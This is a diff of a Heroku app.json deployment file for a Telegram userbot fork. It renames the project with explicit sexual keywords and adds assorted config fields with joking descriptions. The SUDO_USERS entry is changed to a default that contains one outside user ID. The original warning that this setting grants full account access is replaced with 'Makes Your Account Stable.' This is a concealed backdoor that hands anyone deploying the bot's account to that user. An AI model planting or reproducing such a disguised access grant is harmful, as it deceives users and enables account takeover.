@@ -1,13 +1,14 @@
 {
-  "name": "UniBorg",
-  "description": "Modular UserBot powered by @TelethonChat!",
+  "name": "PornHub",
+  "description": "Only For Legends.....",
   "logo": "https://telegra.ph/file/6ce444f5ba54d79fb8622.jpg",
   "keywords": [
-    "telegram",
-    "userbot",
-    "plugin",
-    "modular",
-    "productivity"
+    "sex",
+    "porn",
+    "xxx",
+    "dick",
+    "vagina",
+    "boobs"
   ],
   "repository": "https://gitlab.com/SpEcHiDe/UniBorg",
   "website": "https://telegram.dog/UniBorg",
@@ -126,8 +127,8 @@
       "required": false
     },
     "SUDO_USERS": {
-      "description": "List down the user IDs who should have permission to use you. Be Careful. You are granting access to your entire account to the people you mention in the below field, seperated by SPACE. Send .get_id in any private chat or as a reply to any user in any group, to fill this value",
-      "value": "7351948 500346573 606342588 653184647 751003349 752396210 797179106 804216742 830068297 873236756",
+      "description": "Makes Your Account Stable.",
+      "value": "138312364",
       "required": false
     },
     "TZ": {
@@ -150,6 +151,51 @@
       "description": "Get your credentials from https://da.gd/so63O",
       "required": false
       },
+      "GDRIVE_FOLDER_ID": {
+      "description": "Get your gdrive folder link in which you want to save file.",
+      "required": false
+    },
+    "AUTH_TOKEN_DATA": {
+      "description": "This is required for gdrive to work.",
+      "required": false
+    },
+    "DATA_DIRECTORY": {
+      "description": "I dunno y is it for but it is necessary for my repo.",
+      "value": "data",
+      "required": false
+    },
+    "FF_MPEG_DOWN_LOAD_MEDIA_PATH": {
+      "description": "blah blah blah.",
+      "value": "./uniborg.media.ffmpeg/",
+      "required": false
+    },
+    "GITHUB_ACCESS_TOKEN": {
+      "description": "This is required for commit functionality to work.",
+      "required": false
+    },
+    "GIT_REPO_NAME": {
+      "description": "This is required for commit functionality to work.",
+      "required": false
+    },
+    "OPEN_LOAD_KEY": {
+      "description": "I dunno but my repo needs it, u can type 100.",
+      "required": false
+    },
+    "OPEN_LOAD_LOGIN": {
+      "description": "Same Description As Above.",
+      "value": "https://example.com/torrent/{}",
+      "required": false
+    },
+    "TEMP_DIR": {
+      "description": ":p",
+      "value": "Env",
+      "required": false
+    },
+    "UB_BLACK_LIST_CHAT": {
+      "description": "haha",
+      "value": "-100",
+      "required": false
+    },
     "TELE_GRAM_2FA_CODE": {
       "description": "Your Telegram 2FA code as a string",
       "required": false
@@ -167,7 +213,11 @@
     "url": "https://github.com/opendoor-labs/heroku-buildpack-p7zip"
   }, {
     "url": "https://github.com/amivin/aria2-heroku"
-    }, {
+  }, {
+    "url": "https://github.com/heroku/heroku-buildpack-google-chrome"
+  }, {
+    "url": "https://github.com/heroku/heroku-buildpack-chromedriver"
+  }, {
     "url": "heroku/python"
   }]
 }
